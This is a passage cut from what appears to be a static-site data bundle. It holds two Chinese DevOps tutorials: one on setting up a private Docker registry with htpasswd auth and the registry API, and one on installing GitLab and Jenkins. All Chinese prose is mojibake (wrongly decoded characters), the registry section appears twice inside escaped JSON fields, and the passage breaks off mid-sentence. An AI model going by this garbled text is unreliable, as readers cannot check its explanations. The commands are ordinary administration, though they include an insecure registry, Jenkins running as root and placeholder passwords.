å¦ä¸ä¸å¥ï¼æå¥½æ¯å®¿ä¸»æºç IPï¼ ä¸è¦ä½¿ç¨ 127.0.0.1 ï¼æè¿éæ¯æ¹ä¾¿æµè¯ï¼ä¸ä½¿ç¨å®¿ä¸»æº IPï¼ä¼é æå¨ä½¿ç¨ Docker Engine API æ¥ HTTPS éè¯¯ã\n\n{\n  "insecure-registries": ["127.0.0.1:5000"]\n}\n\n\n1\n2\n3\n\n\néç½®å®æåéè¦éæ°å¯å¨ Docker\n\nsudo systemctl restart docker\n\n\n1\n\n 4. å¯å¨ Registry å®¹å¨ï¼ä½¿ç¨ä»¥ä¸å½ä»¤å¨æ¬å°å¯å¨ Registry å®¹å¨ï¼å®æ¹ææ¡£ https://docs.docker.com/registry/deploying/?_gl=11ytdheb_gaODY2NTEyNi4xNjkyMDAxODU2_ga_XJWPQMJYHQ*MTY5Mzk5NzEyNy4yNS4xLjE2OTM5OTcyMTAuNTMuMC4w#native-basic-auth\n\ndocker run -d -p 5000:5000 --restart=always --name registry -v /opt/software/dockerRegistry:/var/lib/registry -v /opt/software/dockerRegistry/config.yml:/etc/docker/registry/config.yml registry:2\n\n\n1\n\n\nè¿ä¸ªå½ä»¤å°å¨æ¬å°å¯å¨ä¸ä¸ªåä¸º registry çå®¹å¨ï¼å¹¶å°æ¬å°ç /var/lib/registry ç®å½æè½½å°å®¹å¨ç /var/lib/registry ç®å½ï¼ä»¥ä¿å­ Registry çæ°æ®ã\n5. æµè¯ Registryï¼ç°å¨ï¼æ¨çç§æ Docker Registry åºè¯¥å·²ç»å¨æ¬å°æåæ­å»ºãæ¨å¯ä»¥ä½¿ç¨ä»¥ä¸å½ä»¤æ¥æµè¯ Registry æ¯å¦æ­£å¸¸å·¥ä½ï¼\n\n * ä» Docker Hub æåä¸ä¸ªéåï¼\n\ndocker pull ubuntu\n\n\n1\n\n * æ è®°è¯¥éåä¸ºç§æ Registry çå°åï¼\n\ndocker tag ubuntu 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n * å°æ è®°çéåæ¨éå°ç§æ Registryï¼\n\ndocker push 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n * ä»ç§æ Registry æåéåï¼\n\ndocker pull 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n\nå¦æä¸è¿°æ­¥éª¤é½æåæ§è¡ï¼é£ä¹ç§æ Docker Registry å°±å·²ç»æ­å»ºå¥½äºï¼å¹¶ä¸å¯ä»¥éè¿ http://127.0.0.1:5000/v2/my-ubuntu/tags/list è¿è¡è®¿é®ã\n\n\n# config.yml\n\nconfig éé¢æ¯ä¸äºéç½®ä¿¡æ¯ï¼åæ¬å­å¨åºä½ç½®ï¼æ¥å¿ï¼å®å¨è®¤è¯ç­ï¼é¦åè¦éç½®å®å¨è®¤è¯\n\n# å®è£ htpasswd æä»¶çå·¥å·\nyum install -y httpd-tools\n# åå»ºä¸ä¸ª htpasswd æä»¶ï¼å¹¶æ·»å ç¨æ·ååå¯ç \nhtpasswd -Bbn user1 password1 > /opt/software/dockerRegistry/htpasswd\n\n\n1\n2\n3\n4\n\n\néç½® config.xml\n\n# æå®éç½®æä»¶ççæ¬ãç®åå¯ç¨ççæ¬ä¸º0.1ã\nversion: 0.1                                                                                                                                                                           \nlog:                                                                                                                                                                                   \n  fields:                                                                                                                                                                              \n    service: registry                                                                                                                                                                  \nstorage:                                                                                                                                                                               \n  cache:                                                                                                                                                                               \n    blobdescriptor: inmemory                                                                                                                                                           \n  filesystem:         \n    # æå®å­å¨éåæ°æ®çç®å½è·¯å¾ã                                                                                                                                                                 \n    rootdirectory: /var/lib/registry\n  # å¯æ§è¡å é¤æä½ï¼ä¸è½ç                                                                                                                                                   \n  delete:                                                                                                                                                                              \n    enabled: true\n# æ´æ¼ç«¯å£                                                                                                                                                                      \nhttp:                                                                                                                                                                                  \n  addr: :5000                                                                                                                                                                          \n  headers:                                                                                                                                                                             \n    X-Content-Type-Options: [nosniff]    \n# å¿è·³                                                                                                                                              \nhealth:                                                                                                                                                                                \n  storagedriver:                                                                                                                                                                       \n    enabled: true                                                                                                                                                                      \n    interval: 10s                                                                                                                                                                      \n    threshold: 3     \n# åºæ¬è®¤è¯(Basic Auth)ï¼è¿å¯ä»¥ä½¿ç¨Bearer Tokenè®¤è¯ãAWSè®¤è¯ãLDAPè®¤è¯\nauth:\n  htpasswd: \n    realm: registry\n    path: /opt/software/dockerRegistry/htpasswd \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\nå¦æå·²ç»å¯å¨å®¹å¨ï¼ä¿®æ¹åéè¦éæ°å¯å¨å®¹å¨\n\n\n# ä½¿ç¨ Docker Registry\n\næ¥ä¸æ¥åç»å½æä»¬çç§æåºï¼å¦ææ¯æ¬æºï¼ä½¿ç¨ 127.0.0.1ï¼å¦ææ²¡è®¾ç½®è´¦å·å¯ç ï¼åé»è®¤æ¯å®¿ä¸»æºæ¬èº« SSH è¿æ¥çè´¦å·å¯ç \n\ndocker login <registry_host>\n# å¯ä»¥ä½¿ç¨å¿«æ·å½ä»¤\ndocker login 127.0.0.1:5000 --username=xxx --password=xxxx\n\n\n1\n2\n3\n\n\nç»åº\n\ndocker logout <registry_host>\n\n\n1\n\n\nä¸ºéè¦æ¨éçéåæ tagï¼å¿é¡»ï¼\n\ndocker tag my-image:latest 127.0.0.1:5000/my-image:latest\n\n\n1\n\n\næ¨ééå\n\ndocker push localhost:5000/my-image:latest\n\n\n1\n\n\n\n# è®¿é® Registry API\n\nAPI çè®¿é®è¾å¥ä½  docker æå¨ç IPï¼å ä»¥ä¸è®¾ç½®çç«¯å£å°±è¡ï¼è®¿é®éè¦å¸¦çæ¬å·ï¼ç®å Docker å»ºè®®ä½¿ç¨ v2 çæ¬ï¼æä»¥è¯·æ±è·¯å¾éè¦å¸¦ä¸ï¼å¦ï¼ http://xx.xxx.xx.xx:5000/v2/_catalog\n\n * æ£æ¥è¿æ¥ï¼ä¸å®è¦èèå¼å®¹ï¼\n\nGET /v2/\nè¿å 200 ä»£è¡¨ok\nè¿å 401 ä»£è¡¨éè¦èº«ä»½éªè¯\nè¿å 404 ä»£è¡¨æ³¨åè¡¨æªå®ç° /v2/ï¼æå¯è½å°±æ¯ v1\n\n\n1\n2\n3\n4\n\n * ååºå­å¨åºï¼\n\n// è·åå¨é¨\nGET /v2/_catalog\n{\n  "repositories": [\n    <name>,\n    ...\n  ]\n}\n// åé¡µè·å\nGET /v2/_catalog?n=<integer>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * ååºéå tags\n\n/v2/<ImagesName>/tags/list \n\n\n1\n',normalizedContent:'æ­£å¸¸æ¥è¯´æä»¬ä½¿ç¨å«äººçç§æåºå°±è¶³å¤äºï¼æ¯å¦ä½¿ç¨ harborï¼å®å¯ä»¥å¸®æä»¬å¾å¥½çç®¡ç dockerï¼ä»¥åé¨ç½²ä¸ºç§ææå¬æåºç»ä¼ä¸æå¶ä»äººä½¿ç¨ï¼å¦ææ³å¼åä¸å¥é£ä¹éè¦äºè§£ docker ç¸å³ç apiï¼å¶ä¸­ dockerapi åä¸ºå¦ä¸ä¸é¨åï¼\n\n * docker engine apiï¼docker engine api æ¯ docker å¼æç api æ¥å£ï¼ç¨äºä¸ docker å¼æè¿è¡éä¿¡åç®¡çãéè¿ docker engine apiï¼å¯ä»¥ç®¡çå®¹å¨ãéåãç½ç»ãå·ç­ docker ç¸å³èµæºãå¯ä»¥ä½¿ç¨ docker engine api åå»ºãå¯å¨ãåæ­¢åå é¤å®¹å¨ï¼æå»ºåæ¨ééåï¼ä»¥åè¿è¡å®¹å¨åéåçç®¡çåçæ§ã\n * docker hub apiï¼docker hub api æ¯ä¸ docker hub äº¤äºç api æ¥å£ãdocker hub æ¯ä¸ä¸ªå¬å±ç docker éåä»åºï¼ç¨äºå­å¨ååäº« docker éåãdocker hub api åè®¸ç¨æ·éè¿ api æ¥å£ä¸ docker hub è¿è¡äº¤äºï¼å¯ä»¥æç´¢ãä¸è½½ãä¸ä¼ åå é¤éåï¼ç®¡çä»åºãæ ç­¾åç»ç»ç­\n * registry apiï¼registry api æ¯ä¸ docker registry è¿è¡äº¤äºç api æ¥å£ãdocker registry æ¯ä¸ä¸ªç§æç docker éåä»åºï¼å¯ä»¥èªå·±æ­å»ºåç®¡çãregistry api åè®¸ç¨æ·éè¿ api æ¥å£ä¸ç§æç docker registry è¿è¡äº¤äºï¼å¯ä»¥ä¸ä¼ ãä¸è½½åå é¤éåï¼ç®¡çä»åºåæ ç­¾ç­\n\næ²¡éï¼å¦æéè¦å»ºç«èªå·±ç docker ç§æåºå°±è¦ç¨å° registry apiã\n\n\n# åå¤\n\nè¦å¨æ¬å°æ­å»ºç§æç docker registryï¼æ¨å¯ä»¥æç§ä»¥ä¸æ­¥éª¤è¿è¡æä½ï¼\n\n 1. ç¡®ä¿å·²ç»å®è£ dockerï¼è¥è¿æ²¡æï¼æ¨å¯ä»¥ä» docker å®æ¹ç½ç«ï¼https://www.docker.com/ï¼ä¸è½½å¹¶å®è£éç¨äºæ¨çæä½ç³»ç»ç docker çæ¬ã\n 2. éç½® docker registryï¼æ¥ä¸æ¥ï¼æ¨éè¦åå»ºå¹¶éç½® docker registryãå¯ä»¥æç§ä»¥ä¸æ­¥éª¤è¿è¡éç½®ï¼\n    * åå»ºä¸ä¸ªå­å¨ registry æ°æ®çç®å½ãä¾å¦ï¼æ¨å¯ä»¥åå»ºä¸ä¸ªåä¸º /var/lib/registry çç®å½ã\n    * åå»ºä¸ä¸ªåä¸º config.yml çéç½®æä»¶ï¼å¹¶å¨å¶ä¸­æå® registry çéç½®éé¡¹ãä¾å¦ï¼æ¨å¯ä»¥æå® registry çå¬å¨ 5000 ç«¯å£ä¸ï¼å¹¶åè®¸å¿åè®¿é®ãï¼å·ä½è§ä¸é¢ config éç½®è®²è§£ï¼\n 3. ä¸º docker registry api æåéç½®\n    åè¿è¡éç½®ï¼å» /etc/docker/daemon.json æ·»å å¦ä¸ä¸å¥ï¼æå¥½æ¯å®¿ä¸»æºç ipï¼ ä¸è¦ä½¿ç¨ 127.0.0.1 ï¼æè¿éæ¯æ¹ä¾¿æµè¯ï¼ä¸ä½¿ç¨å®¿ä¸»æº ipï¼ä¼é æå¨ä½¿ç¨ docker engine api æ¥ https éè¯¯ã\n\n{\n  "insecure-registries": ["127.0.0.1:5000"]\n}\n\n\n1\n2\n3\n\n\néç½®å®æåéè¦éæ°å¯å¨ docker\n\nsudo systemctl restart docker\n\n\n1\n\n 4. å¯å¨ registry å®¹å¨ï¼ä½¿ç¨ä»¥ä¸å½ä»¤å¨æ¬å°å¯å¨ registry å®¹å¨ï¼å®æ¹ææ¡£ https://docs.docker.com/registry/deploying/?_gl=11ytdheb_gaody2nteyni4xnjkymdaxodu2_ga_xjwpqmjyhq*mty5mzk5nzeyny4yns4xlje2otm5otcymtauntmumc4w#native-basic-auth\n\ndocker run -d -p 5000:5000 --restart=always --name registry -v /opt/software/dockerregistry:/var/lib/registry -v /opt/software/dockerregistry/config.yml:/etc/docker/registry/config.yml registry:2\n\n\n1\n\n\nè¿ä¸ªå½ä»¤å°å¨æ¬å°å¯å¨ä¸ä¸ªåä¸º registry çå®¹å¨ï¼å¹¶å°æ¬å°ç /var/lib/registry ç®å½æè½½å°å®¹å¨ç /var/lib/registry ç®å½ï¼ä»¥ä¿å­ registry çæ°æ®ã\n5. æµè¯ registryï¼ç°å¨ï¼æ¨çç§æ docker registry åºè¯¥å·²ç»å¨æ¬å°æåæ­å»ºãæ¨å¯ä»¥ä½¿ç¨ä»¥ä¸å½ä»¤æ¥æµè¯ registry æ¯å¦æ­£å¸¸å·¥ä½ï¼\n\n * ä» docker hub æåä¸ä¸ªéåï¼\n\ndocker pull ubuntu\n\n\n1\n\n * æ è®°è¯¥éåä¸ºç§æ registry çå°åï¼\n\ndocker tag ubuntu 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n * å°æ è®°çéåæ¨éå°ç§æ registryï¼\n\ndocker push 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n * ä»ç§æ registry æåéåï¼\n\ndocker pull 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n\nå¦æä¸è¿°æ­¥éª¤é½æåæ§è¡ï¼é£ä¹ç§æ docker registry å°±å·²ç»æ­å»ºå¥½äºï¼å¹¶ä¸å¯ä»¥éè¿ http://127.0.0.1:5000/v2/my-ubuntu/tags/list è¿è¡è®¿é®ã\n\n\n# config.yml\n\nconfig éé¢æ¯ä¸äºéç½®ä¿¡æ¯ï¼åæ¬å­å¨åºä½ç½®ï¼æ¥å¿ï¼å®å¨è®¤è¯ç­ï¼é¦åè¦éç½®å®å¨è®¤è¯\n\n# å®è£ htpasswd æä»¶çå·¥å·\nyum install -y httpd-tools\n# åå»ºä¸ä¸ª htpasswd æä»¶ï¼å¹¶æ·»å ç¨æ·ååå¯ç \nhtpasswd -bbn user1 password1 > /opt/software/dockerregistry/htpasswd\n\n\n1\n2\n3\n4\n\n\néç½® config.xml\n\n# æå®éç½®æä»¶ççæ¬ãç®åå¯ç¨ççæ¬ä¸º0.1ã\nversion: 0.1                                                                                                                                                                           \nlog:                                                                                                                                                                                   \n  fields:                                                                                                                                                                              \n    service: registry                                                                                                                                                                  \nstorage:                                                                                                                                                                               \n  cache:                                                                                                                                                                               \n    blobdescriptor: inmemory                                                                                                                                                           \n  filesystem:         \n    # æå®å­å¨éåæ°æ®çç®å½è·¯å¾ã                                                                                                                                                                 \n    rootdirectory: /var/lib/registry\n  # å¯æ§è¡å é¤æä½ï¼ä¸è½ç                                                                                                                                                   \n  delete:                                                                                                                                                                              \n    enabled: true\n# æ´æ¼ç«¯å£                                                                                                                                                                      \nhttp:                                                                                                                                                                                  \n  addr: :5000                                                                                                                                                                          \n  headers:                                                                                                                                                                             \n    x-content-type-options: [nosniff]    \n# å¿è·³                                                                                                                                              \nhealth:                                                                                                                                                                                \n  storagedriver:                                                                                                                                                                       \n    enabled: true                                                                                                                                                                      \n    interval: 10s                                                                                                                                                                      \n    threshold: 3     \n# åºæ¬è®¤è¯(basic auth)ï¼è¿å¯ä»¥ä½¿ç¨bearer tokenè®¤è¯ãawsè®¤è¯ãldapè®¤è¯\nauth:\n  htpasswd: \n    realm: registry\n    path: /opt/software/dockerregistry/htpasswd \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\nå¦æå·²ç»å¯å¨å®¹å¨ï¼ä¿®æ¹åéè¦éæ°å¯å¨å®¹å¨\n\n\n# ä½¿ç¨ docker registry\n\næ¥ä¸æ¥åç»å½æä»¬çç§æåºï¼å¦ææ¯æ¬æºï¼ä½¿ç¨ 127.0.0.1ï¼å¦ææ²¡è®¾ç½®è´¦å·å¯ç ï¼åé»è®¤æ¯å®¿ä¸»æºæ¬èº« ssh è¿æ¥çè´¦å·å¯ç \n\ndocker login <registry_host>\n# å¯ä»¥ä½¿ç¨å¿«æ·å½ä»¤\ndocker login 127.0.0.1:5000 --username=xxx --password=xxxx\n\n\n1\n2\n3\n\n\nç»åº\n\ndocker logout <registry_host>\n\n\n1\n\n\nä¸ºéè¦æ¨éçéåæ tagï¼å¿é¡»ï¼\n\ndocker tag my-image:latest 127.0.0.1:5000/my-image:latest\n\n\n1\n\n\næ¨ééå\n\ndocker push localhost:5000/my-image:latest\n\n\n1\n\n\n\n# è®¿é® registry api\n\napi çè®¿é®è¾å¥ä½  docker æå¨ç ipï¼å ä»¥ä¸è®¾ç½®çç«¯å£å°±è¡ï¼è®¿é®éè¦å¸¦çæ¬å·ï¼ç®å docker å»ºè®®ä½¿ç¨ v2 çæ¬ï¼æä»¥è¯·æ±è·¯å¾éè¦å¸¦ä¸ï¼å¦ï¼ http://xx.xxx.xx.xx:5000/v2/_catalog\n\n * æ£æ¥è¿æ¥ï¼ä¸å®è¦èèå¼å®¹ï¼\n\nget /v2/\nè¿å 200 ä»£è¡¨ok\nè¿å 401 ä»£è¡¨éè¦èº«ä»½éªè¯\nè¿å 404 ä»£è¡¨æ³¨åè¡¨æªå®ç° /v2/ï¼æå¯è½å°±æ¯ v1\n\n\n1\n2\n3\n4\n\n * ååºå­å¨åºï¼\n\n// è·åå¨é¨\nget /v2/_catalog\n{\n  "repositories": [\n    <name>,\n    ...\n  ]\n}\n// åé¡µè·å\nget /v2/_catalog?n=<integer>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * ååºéå tags\n\n/v2/<imagesname>/tags/list \n\n\n1\n',charsets:{cjk:!0}},{title:"Jenkins(äº) Jenkinså®è£åç¯å¢éç½®",frontmatter:{title:"Jenkins(äº) Jenkinså®è£åç¯å¢éç½®",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/501",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/50.Jenkins/501.Jenkins(%E4%BA%8C)%20Jenkins%E5%AE%89%E8%A3%85%E5%92%8C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE.html",relativePath:"01.è¿ç»´/50.Jenkins/501.Jenkins(äº) Jenkinså®è£åç¯å¢éç½®.md",key:"v-78cfb480",path:"/jenkins/501/",headers:[{level:2,title:"æç»­éææµç¨è¯´æ",slug:"æç»­éææµç¨è¯´æ",normalizedTitle:"æç»­éææµç¨è¯´æ",charIndex:2},{level:2,title:"Gitlabä»£ç æç®¡æå¡å¨å®è£",slug:"gitlabä»£ç æç®¡æå¡å¨å®è£",normalizedTitle:"gitlab ä»£ç æç®¡æå¡å¨å®è£",charIndex:433},{level:3,title:"Gitlabç®ä»",slug:"gitlabç®ä»",normalizedTitle:"gitlab ç®ä»",charIndex:454},{level:3,title:"Gitlabå®è£",slug:"gitlabå®è£",normalizedTitle:"gitlab å®è£",charIndex:763},{level:2,title:"Gitlabæ·»å ç»ãåå»ºç¨æ·ãåå»ºé¡¹ç®",slug:"gitlabæ·»å ç»ãåå»ºç¨æ·ãåå»ºé¡¹ç®",normalizedTitle:"gitlab æ·»å ç»ãåå»ºç¨æ·ãåå»ºé¡¹ç®",charIndex:1771},{level:2,title:"Jenkinså®è£",slug:"jenkinså®è£",normalizedTitle:"jenkins å®è£",charIndex:2310},{level:2,title:"jenkinsæä»¶ç®¡ç",slug:"jenkinsæä»¶ç®¡ç",normalizedTitle:"jenkins æä»¶ç®¡ç",charIndex:4225},{level:3,title:"ä¿®æ¹Jenkinsæä»¶ä¸è½½å°å",slug:"ä¿®æ¹jenkinsæä»¶ä¸è½½å°å",normalizedTitle:"ä¿®æ¹ jenkins æä»¶ä¸è½½å°å",charIndex:4334},{level:2,title:"Jenkins å¸è½½",slug:"jenkins-å¸è½½",normalizedTitle:"jenkins å¸è½½",charIndex:5079}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"æç»­éææµç¨è¯´æ Gitlabä»£ç æç®¡æå¡å¨å®è£ Gitlabç®ä» Gitlabå®è£ Gitlabæ·»å ç»ãåå»ºç¨æ·ãåå»ºé¡¹ç® Jenkinså®è£ jenkinsæä»¶ç®¡ç ä¿®æ¹Jenkinsæä»¶ä¸è½½å°å Jenkins å¸è½½",content:'# æç»­éææµç¨è¯´æ\n\n\n\n1. é¦åï¼å¼åäººåæ¯å¤©è¿è¡ä»£ç æäº¤ï¼æäº¤å° Git ä»åº\n2. ç¶åï¼Jenkins ä½ä¸ºæç»­éæå·¥å·ï¼ä½¿ç¨ Git å·¥å·å° Git ä»åºæåä»£ç å°éææå¡å¨ï¼åéå JDKï¼Maven ç­è½¯ä»¶å®æä»£ç ç¼è¯ï¼ä»£ç æµè¯ä¸å®¡æ¥ï¼æµè¯ï¼æåç­å·¥ä½ï¼å¨è¿ä¸ªè¿ç¨ä¸­æ¯ä¸æ­¥åºéï¼é½éæ°åæ§è¡ä¸æ¬¡æ´ä¸ªæµç¨ã\n3. æåï¼Jenkins æçæç jar æ war åååå°æµè¯æå¡å¨æèçäº§æå¡å¨ï¼æµè¯äººåæç¨æ·å°±å¯ä»¥è®¿é®åºç¨ã\n\næå¡å¨åè¡¨\n\nåç§°         IP å°å            å®è£çè½¯ä»¶\nä»£ç æç®¡æå¡å¨    192.168.66.100   Gitlab-12.4.2\næç»­éææå¡å¨    192.168.66.101   Jenkins-2.190.3ï¼JDK1.8ï¼Maven3.6.2ï¼Gitï¼SonarQube\næµè¯æçäº§æå¡å¨   192.168.66.102   JDK1.8ï¼Tomcat8.5\n\n\n# Gitlab ä»£ç æç®¡æå¡å¨å®è£\n\n\n# Gitlab ç®ä»\n\nå®ç½ï¼ https://about.gitlab.com/\n\nGitLab æ¯ä¸ä¸ªç¨äºä»åºç®¡çç³»ç»çå¼æºé¡¹ç®ï¼ä½¿ç¨ Git ä½ä¸ºä»£ç ç®¡çå·¥å·ï¼å¹¶å¨æ­¤åºç¡ä¸æ­å»ºèµ·æ¥ç web æå¡ã\n\nGitLab å GitHub ä¸æ ·å±äºç¬¬ä¸æ¹åºäº Git å¼åçä½åï¼åè´¹ä¸å¼æºï¼åºäº MIT åè®®ï¼ï¼ä¸ Github ç±»ä¼¼ï¼å¯ä»¥æ³¨åç¨æ·ï¼ä»»ææäº¤ä½ çä»£ç ï¼æ·»å  SSHKey ç­ç­ãä¸åçæ¯ï¼GitLab æ¯å¯ä»¥é¨ç½²å°èªå·±çæå¡å¨ä¸ï¼æ°æ®åºç­ä¸åä¿¡æ¯é½ææ¡å¨èªå·±æä¸ï¼éåå¢éåé¨åä½å¼åï¼ä½ æ»ä¸å¯è½æå¢éåé¨çæºæ§æ»æ¾å¨å«äººçæå¡å¨ä¸å§ï¼ç®åæ¥è¯´å¯æ GitLab çä½ä¸ªäººçç GitHubã\n\n\n# Gitlab å®è£\n\n1. å®è£ç¸å³ä¾èµ\n\nyum -y install policycoreutils openssh-server openssh-clients postfix\n\n\n1\n\n\n2. å¯å¨ ssh æå¡ & è®¾ç½®ä¸ºå¼æºå¯å¨\n\nsystemctl enable sshd && sudo systemctl start sshd\n\n\n1\n\n\n3. è®¾ç½® postfix å¼æºèªå¯ï¼å¹¶å¯å¨ï¼postfix æ¯æ gitlab åä¿¡åè½\n\nsystemctl enable postfix && systemctl start postfix\n\n\n1\n\n\n4. å¼æ¾ ssh ä»¥å http æå¡ï¼ç¶åéæ°å è½½é²ç«å¢åè¡¨\n\nfirewall-cmd --add-service=ssh --permanent\nfirewall-cmd --add-service=http --permanent\nfirewall-cmd --reload\n\n\n1\n2\n3\n\n\n> å¦æå³é­é²ç«å¢å°±ä¸éè¦åä»¥ä¸éç½®\n\n5. ä¸è½½ gitlab åï¼å¹¶ä¸å®è£\nå¨çº¿ä¸è½½å®è£åï¼\n\nwget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el6/gitlab-ce-12.4.2-ce.0.el6.x86_64.rpm\n# å®è£\nrpm -i gitlab-ce-12.4.2-ce.0.el6.x86_64.rpm\n\n\n1\n2\n3\n\n\n6. ä¿®æ¹ gitlab éç½®\n\nvi /etc/gitlab/gitlab.rb\n# ä¿®æ¹gitlabè®¿é®å°ååç«¯å£ï¼é»è®¤ä¸º80ï¼æä»¬æ¹ä¸º82\nexternal_url \'http://192.168.66.100:82\'\nnginx[\'listen_port\'] = 82\n\n\n1\n2\n3\n4\n\n 7. éè½½éç½®åå¯å¨ gitlab\n\ngitlab-ctl reconfigure\ngitlab-ctl restart\n\n\n1\n2\n\n\n8. æç«¯å£æ·»å å°é²ç«å¢\n\nfirewall-cmd --zone=public --add-port=82/tcp --permanent\nfirewall-cmd --reload\n\n\n1\n2\n\n\nå¯å¨æååï¼çå°ä»¥ä¸ä¿®æ¹ç®¡çå root å¯ç çé¡µé¢ï¼ä¿®æ¹å¯ç åï¼ç¶åç»å½å³å¯\n\n\n# Gitlab æ·»å ç»ãåå»ºç¨æ·ãåå»ºé¡¹ç®\n\n1. åå»ºç»\nä½¿ç¨ç®¡çå root åå»ºç»ï¼ä¸ä¸ªç»éé¢å¯ä»¥æå¤ä¸ªé¡¹ç®åæ¯ï¼å¯ä»¥å°å¼åæ·»å å°ç»éé¢è¿è¡è®¾ç½®æéï¼ä¸åçç»å°±æ¯å¬å¸ä¸åçå¼åé¡¹ç®æèæå¡æ¨¡åï¼ä¸åçç»æ·»å ä¸åçå¼åå³å¯å®ç°å¯¹å¼åè®¾ç½®æéçç®¡ç\n\n2. åå»ºç¨æ·\nåå»ºç¨æ·çæ¶åï¼å¯ä»¥éæ© Regular æ Admin ç±»åãåå»ºå®ç¨æ·åï¼ç«å³ä¿®æ¹å¯ç \n\n3. å°ç¨æ·æ·»å å°ç»ä¸­\néæ©æä¸ªç¨æ·ç»ï¼è¿è¡ Members ç®¡çç»çæå\n\nGitlab ç¨æ·å¨ç»éé¢æ 5 ç§ä¸åæéï¼\n\n * Guestï¼å¯ä»¥åå»º issueãåè¡¨è¯è®ºï¼ä¸è½è¯»åçæ¬åº Reporterï¼å¯ä»¥åéä»£ç ï¼ä¸è½æäº¤ï¼QAãPM å¯ä»¥èµäºè¿ä¸ªæé\n * Developerï¼å¯ä»¥åéä»£ç ãå¼åãæäº¤ãpushï¼æ®éå¼åå¯ä»¥èµäºè¿ä¸ªæé\n * Maintainerï¼å¯ä»¥åå»ºé¡¹ç®ãæ·»å  tagãä¿æ¤åæ¯ãæ·»å é¡¹ç®æåãç¼è¾é¡¹ç®ï¼æ ¸å¿å¼åå¯ä»¥èµäºè¿ä¸ªæé\n * Ownerï¼å¯ä»¥è®¾ç½®é¡¹ç®è®¿é®æé - Visibility Levelãå é¤é¡¹ç®ãè¿ç§»é¡¹ç®ãç®¡çç»æåï¼å¼åç»ç»é¿å¯ä»¥èµäºè¿ä¸ªæé\n\n4. å¨ç¨æ·ç»ä¸­åå»ºé¡¹ç®\nä»¥åæåå»ºçæ°ç¨æ·èº«ä»½ç»å½å° Gitlabï¼ç¶åå¨ç¨æ·ç»ä¸­åå»ºæ°çé¡¹ç®\n\n\n# Jenkins å®è£\n\n1. è·å jenkins å®è£åï¼ä¸è½½é¡µé¢ï¼http://mirrors.jenkins-ci.org/redhat/\n\n# å½åç¯å¢ä¸æ¯é£ä¹å¥½ï¼ä¸è½½è¦ç§å­¦\nwget http://mirrors.jenkins-ci.org/redhat/jenkins-2.190.3-1.1.noarch.rpm\n# å®è£\nrpm -ivh jenkins-2.190.3-1.1.noarch.rpm\n\n\n1\n2\n3\n4\n\n\n2. ä¿®æ¹ Jenkins éç½®\n\nvim /etc/sysconfig/jenkins\n# ä¿®æ¹åå®¹å¦ä¸\n# è½æ§è¡jenkinsçç¨æ·æé\nJENKINS_USER="root" \n# é¡µé¢è®¿é®ç«¯å£\nJENKINS_PORT="7777" \n\n\n1\n2\n3\n4\n5\n6\n\n\n3. å¯å¨ Jenkins\n\nsystemctl start jenkins\n\n\n1\n\n\n> æ¥é\n> Starting Jenkins bash: /usr/bin/java: æ²¡æé£ä¸ªæä»¶æç®å½\n> Failed to start LSB: Jenkins Automation Server.\n> æ¯å ä¸º jenkins åé¨èªå·±éç½®äº java å°åï¼éè¦æ¹ä¸ä¸ã\n> vim /etc/init.d/jenkins\n> /usr/bin/java æ¾å°ï¼å¹¶æ¹æèªå·±ç java å°åï¼æçæ¯ /opt/software/java8/jre/bin/javaï¼æ³¨æè¿éæ¾çæ¯ jre çã\n> æ§è¡ systemctl daemon-reloadï¼å¨æ§è¡ systemctl start jenkins\n\n> ææ°çæ¬ Jenkins 2.346.1 åä¹åçæ¬è¿æ¯æä¸ä¸æ ·çå°æ¹ï¼è¿éåªè¯´å ä¸ª Jenkins 2.346.1 éå°çæ¥éï¼\n> 1 Aug 16 14:19:14 host-10-240-30-93 jenkins [31531]: jenkins: failed to find a valid Java installation è¿ç§æ¥éä¸ç´è¯´æ¯æ²¡å®è£ JAVAï¼ä½æ¯ææææç§ä»¥ä¸æ¹å¼é½éç½®è¿äºï¼æç»è§£å³æ¹å¼å°±æ¯ç¼è¾ vim /usr/lib/systemd/system/jenkins.service æä»¶ï¼æ¾å°è¢«æ³¨éç Environment="JAVA_HOME="ï¼æèªå·±ç JAVA è·¯å¾åä¸ï¼å¦ /opt/software/jdk\n> 2 Aug 16 14:26:42 host-10-240-30-93 jenkins [10782]: java.net.BindException: Address already in use ä½ ä¼åç°å¨ vim /etc/sysconfig/jenkins æä»¶é½æ¹è¿äºï¼ä½è¿æ¯ç«¯å£å ç¨ï¼ä¾ç¶éè¦ä¿®æ¹ vim /usr/lib/systemd/system/jenkins.service æä»¶ï¼å¹¶ç¼è¾ Environment="JENKINS_PORT=7777" æ¹æèªå·±éè¦çç«¯å£\n> 3 Aug 16 14:28:37 host-10-240-30-93 jenkins [20925]: Caused: java.io.IOException: Failed to start Jetty æ£æ¥ææéç½®åæ¬ /etc/sysconfig/jenkins å /usr/lib/systemd/system/jenkins.serviceï¼å´æ¥éç½®æ­£ç¡®\n> 4 Aug 16 14:44:10 host-10-240-30-93 jenkins [12516]: jenkins: invalid Java version: java version "17.0.3.1" 2022-04-22 LTS JAVA çæ¬è¿é«æè¿ä½å¯¼è´ï¼æç¨ java17 æ 11 ç´æ¥ä¸è¡ï¼æ¢æ 8 å°±å¥½äº\n\n4. æå¼æµè§å¨è®¿é®\nhttp://192.168.66.101:7777\n\n> æ³¨æï¼æ¬æå¡å¨æé²ç«å¢å³é­äºï¼å¦æå¼å¯é²ç«å¢ï¼éè¦å¨é²ç«å¢æ·»å 